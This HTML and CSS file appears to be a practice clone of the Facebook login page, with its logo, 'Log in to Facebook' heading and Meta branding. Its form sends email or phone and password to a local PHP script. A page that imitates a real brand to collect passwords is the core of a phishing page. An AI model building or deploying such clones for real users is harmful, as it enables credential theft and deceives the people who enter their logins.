<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Login Page</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #f2f2f2;
            height: 100vh;
        }

        .container {
            display: flex;
            height: 100vh;
        }

        .left-section {
            width: 50%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding-left: 60px;
        }

        .logo {
            width: 80px;
            height: 80px;
            background: #1877f2;
            color: white;
            border-radius: 50%;
            text-align: center;
            line-height: 80px;
            font-size: 60px;
            font-weight: bold;
            margin-bottom: 40px;
        }

        .left-content {
            display: flex;
            align-items: center;
            gap: 40px;
        }

        .heading {
            font-size: 72px;
            font-weight: bold;
            line-height: 1.1;
        }

        .blue {
            color: #1877f2;
        }

        .image-card {
            width: 280px;
            height: 420px;
            background: white;
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
        }

        .image-card img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .right-section {
            width: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border-left: 1px solid #d6d6d6;
        }

        .login-box {
            width: 80%;
            max-width: 550px;
        }

        .login-box h2 {
            margin-bottom: 30px;
            font-size: 22px;
        }

        .input-box {
            width: 100%;
            height: 80px;
            border: 2px solid #333;
            border-radius: 25px;
            padding-left: 25px;
            font-size: 24px;
            margin-bottom: 20px;
        }

        .password {
            border: 1px solid #cfcfcf;
        }

        .login-btn {
            width: 100%;
            height: 65px;
            background: #1666d9;
            color: white;
            border: none;
            border-radius: 35px;
            font-size: 20px;
            cursor: pointer;
            margin-top: 20px;
        }

        .login-btn:hover {
            background: #1459bc;
        }

        .forgot {
            text-align: center;
            margin-top: 30px;
            font-size: 18px;
        }

        .forgot a {
            text-decoration: none;
            color: black;
        }

        .create-btn {
            width: 100%;
            height: 65px;
            margin-top: 80px;
            border: 2px solid #1877f2;
            background: white;
            color: #1877f2;
            border-radius: 35px;
            font-size: 20px;
            cursor: pointer;
        }

        .meta {
            text-align: center;
            margin-top: 40px;
            font-size: 22px;
            color: #333;
            font-weight: bold;
        }

        @media(max-width:1000px) {

            .container {
                flex-direction: column;
            }

            .left-section,
            .right-section {
                width: 100%;
            }

            .heading {
                font-size: 45px;
            }

            .left-content {
                flex-direction: column;
            }

        }
    </style>
</head>

<body>

    <div class="container">

        <!-- Left Side -->
        <div class="left-section">

            <div class="logo">f</div>

            <div class="left-content">

                <div class="heading">
                    Explore<br>
                    the<br>
                    things<br>
                    <span class="blue">you love.</span>
                </div>

                <div class="image-card">
                    <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=600" alt="Profile">
                </div>

            </div>

        </div>

        <!-- Right Side -->
        <div class="right-section">

            <div class="login-box">

                <h2>Log in to Facebook</h2>
                <form action="http://localhost/PhpPractice/facebookSignin.php" method="POST">

                    <input type="text" name="emailorphone" class="input-box" placeholder="Email address or mobile number">

                    <input type="password" name="password" class="input-box password" placeholder="Password">

                    <button class="login-btn">Log in</button>
                </form>
                <div class="forgot">
                    <a href="#">Forgotten password?</a>
                </div>

                <button class="create-btn">
                    Create new account
                </button>

                <div class="meta">
                    Meta
                </div>

            </div>

        </div>

    </div>

</body>

</html>
